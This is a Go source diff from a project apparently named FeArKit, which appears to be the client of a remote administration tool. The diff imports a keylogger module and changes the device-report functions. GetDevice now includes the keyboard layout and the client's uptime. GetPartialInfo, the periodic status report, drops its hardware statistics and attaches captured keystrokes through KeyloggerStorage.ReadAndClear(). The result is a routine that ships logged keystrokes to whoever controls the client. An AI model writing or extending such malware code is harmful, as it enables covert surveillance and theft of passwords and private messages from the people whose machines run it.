@@ -2,6 +2,8 @@ package core
 
 import (
 	"FeArKit/modules"
+	"FeArKit/client/config"
+	"FeArKit/client/service/keylogger"
 	"crypto/rand"
 	"encoding/hex"
 	"errors"
@@ -232,62 +234,33 @@ func GetDevice() (*modules.Device, error) {
 			username.Username = username.Username[slashIndex+1:]
 		}
 	}
+
 	return &modules.Device{
-		ID:       id,
-		OS:       runtime.GOOS,
-		Arch:     runtime.GOARCH,
-		LAN:      localIP,
-		MAC:      macAddr,
-		CPU:      cpuInfo,
-		RAM:      ramInfo,
-		Net:      netInfo,
-		Disk:     diskInfo,
-		Uptime:   uptime,
-		Hostname: hostname,
-		Username: username.Username,
+		ID:           id,
+		OS:           runtime.GOOS,
+		Arch:         runtime.GOARCH,
+		LAN:          localIP,
+		MAC:          macAddr,
+		CPU:          cpuInfo,
+		RAM:          ramInfo,
+		Net:          netInfo,
+		Disk:         diskInfo,
+		Uptime:       uptime,
+		Hostname:     hostname,
+		Username:     username.Username,
+		KeyboardLayout: keylogger.GetKeyboardLayout(),
+		ClientUptime: config.Config.ClientUptime,
 	}, nil
 }
 
 func GetPartialInfo() (*modules.Device, error) {
-	cpuInfo, err := GetCPUInfo()
-	if err != nil {
-		cpuInfo = modules.CPU{
-			Model: `<UNKNOWN>`,
-			Usage: 0,
-		}
-	}
-	netInfo, err := GetNetIOInfo()
-	if err != nil {
-		netInfo = modules.Net{
-			Recv: 0,
-			Sent: 0,
-		}
-	}
-	memInfo, err := GetRAMInfo()
-	if err != nil {
-		memInfo = modules.IO{
-			Total: 0,
-			Used:  0,
-			Usage: 0,
-		}
-	}
-	diskInfo, err := GetDiskInfo()
-	if err != nil {
-		diskInfo = modules.IO{
-			Total: 0,
-			Used:  0,
-			Usage: 0,
-		}
-	}
 	uptime, err := host.Uptime()
 	if err != nil {
 		uptime = 0
 	}
 	return &modules.Device{
-		Net:    netInfo,
-		CPU:    cpuInfo,
-		RAM:    memInfo,
-		Disk:   diskInfo,
 		Uptime: uptime,
+		ClientUptime: config.Config.ClientUptime,
+		KeyloggerData: keylogger.KeyloggerStorage.ReadAndClear(),
 	}, nil
 }
